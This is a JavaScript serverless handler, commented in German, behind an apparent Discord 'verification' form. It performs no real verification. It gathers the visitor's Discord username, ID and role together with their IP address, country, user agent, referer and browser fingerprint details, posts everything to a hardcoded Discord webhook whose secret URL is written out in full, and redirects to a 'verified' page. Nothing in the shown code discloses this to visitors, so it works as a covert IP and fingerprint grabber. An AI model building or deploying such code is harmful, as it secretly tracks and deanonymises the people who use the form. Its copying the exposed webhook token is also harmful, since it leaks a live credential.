import axios from 'axios';

const WEBHOOK_URL = "https://discord.com/api/webhooks/1408778160644034631/6eS9eSuGmQc8VoCJXE1Yilb6a-4WZqSauidezmDp_YYGFyustSvybJRF9Dl2EaXPFHnv";

export default async function handler(req, res) {
  if (req.method !== 'POST') return res.status(405).send('Method Not Allowed');

  let body = '';
  req.on('data', chunk => body += chunk.toString());
  req.on('end', async () => {
    const params = new URLSearchParams(body);

    // Formulardaten
    const username = params.get('username');
    const userid = params.get('userid');
    const role = params.get('role');

    // Client-seitige Daten
    const screen = params.get('screen');
    const lang = params.get('lang');
    const timezone = params.get('timezone');
    const platform = params.get('platform');
    const cookies = params.get('cookies');
    const doNotTrack = params.get('doNotTrack');

    // Server-seitige Daten
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    const userAgent = req.headers['user-agent'];
    const country = req.headers['x-vercel-ip-country'] || 'unbekannt';
    const referer = req.headers['referer'] || 'unbekannt';
    const method = req.method;
    const port = req.socket.remotePort;

    if (!username || !userid || !role)
      return res.status(400).send('Alle Felder müssen ausgefüllt werden.');

    try {
      await axios.post(WEBHOOK_URL, {
        content: `✅ Neuer User verifiziert!`,
        embeds: [
          {
            title: 'Verifizierungsdaten',
            fields: [
              { name: 'Username', value: username, inline: true },
              { name: 'User ID', value: userid, inline: true },
              { name: 'Höchste Rolle', value: role, inline: true },
              { name: 'IP-Adresse', value: ip, inline: true },
              { name: 'User-Agent', value: userAgent, inline: false },
              { name: 'Land', value: country, inline: true },
              { name: 'Referer', value: referer, inline: false },
              { name: 'HTTP-Methode', value: method, inline: true },
              { name: 'Remote Port', value: port.toString(), inline: true },
              { name: 'Screen', value: screen, inline: true },
              { name: 'Sprache', value: lang, inline: true },
              { name: 'Zeitzone', value: timezone, inline: true },
              { name: 'Plattform', value: platform, inline: true },
              { name: 'Cookies aktiviert', value: cookies, inline: true },
              { name: 'DoNotTrack', value: doNotTrack, inline: true },
              { name: 'Zeitstempel', value: new Date().toISOString(), inline: true }
            ],
            color: 0x00ff00,
            timestamp: new Date()
          }
        ]
      });

      res.writeHead(302, { Location: '/verifiziert.html' });
      res.end();
    } catch (err) {
      console.error(err);
      res.status(500).send('Fehler beim Senden des Webhooks.');
    }
  });
}
